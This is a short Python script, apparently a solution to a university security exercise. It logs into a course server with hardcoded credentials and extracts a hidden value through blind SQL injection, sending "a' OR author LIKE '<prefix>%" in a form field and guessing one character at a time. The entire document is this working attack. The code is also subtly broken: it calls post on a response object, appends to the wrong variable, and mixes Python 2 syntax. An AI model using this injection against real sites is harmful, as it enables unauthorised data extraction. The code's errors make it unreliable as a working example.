import requests
import string

str1 = ""
charset = string.ascii_letters + string.digits + "}{"

login_data = {'username':'vikasm', 'password':'d8cc807bc261c6f21b777e70b29bfef0'}
r = requests.post("https://cseproj91.cse.iitk.ac.in:9876/login.php", login_data)

while True:
    for char in charset:
        curr = str1 + char
        request = {'title': "a' OR author LIKE '" + curr + "%", 'action' : 'submit'}
        e = r.post("https://cseproj91.cse.iitk.ac.in:9876/index.php", request)
        if "OOPS" not in e.text:
            str += char
            print str